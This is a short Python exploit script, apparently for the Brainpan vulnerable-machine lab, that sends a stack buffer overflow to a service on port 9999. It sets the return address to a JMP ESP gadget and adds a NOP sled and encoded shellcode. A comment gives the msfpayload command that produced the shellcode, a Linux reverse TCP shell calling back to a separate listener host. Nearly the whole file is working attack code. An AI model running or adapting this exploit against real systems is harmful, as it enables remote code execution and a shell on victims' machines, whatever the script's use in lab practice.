#!/usr/bin/python
#brainpan.exe exploit
import socket, re, time, struct

HOST = '172.16.199.140'
PORT = 9999

eip_offset = 524

def p(s):
    return struct.pack("<L", s)

def hitit(pwnd):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.send(pwnd)
    data = s.recv(1024)
    for q in range(0, 10):
        data += s.recv(1024)
    s.close()
    return data

jmpesp = p(0x311712F3)

#msfpayload linux/x86/shell_reverse_tcp LHOST=172.16.199.137 LPORT=8888 R | msfencode -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -t c

shellcode = ( 
"\xdb\xdb\xb8\xde\xc1\x31\x13\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x12\x83\xc6\x04\x31\x46\x13\x03\x98\xd2\xd3\xe6\x15\x0e\xe4"
"\xea\x06\xf3\x58\x87\xaa\x7a\xbf\xe7\xcc\xb1\xc0\x9b\x49\xfa"
"\xfe\x56\xe9\xb3\x79\x90\x81\xef\x6a\xa5\xd8\x98\x88\x29\xf8"
"\xe0\x04\xc8\x4c\x76\x47\x5a\xff\xc4\x64\xd5\x1e\xe7\xeb\xb7"
"\x88\xd7\xc4\x44\x20\x40\x34\xc9\xd9\xfe\xc3\xee\x4b\xac\x5a"
"\x11\xdb\x59\x90\x52")

tehgoodz = ""
tehgoodz += "A" * (eip_offset - len(tehgoodz))
tehgoodz += jmpesp
tehgoodz += "\x90" * 10
tehgoodz += shellcode

hitit(tehgoodz)
print "GETINDERRR"
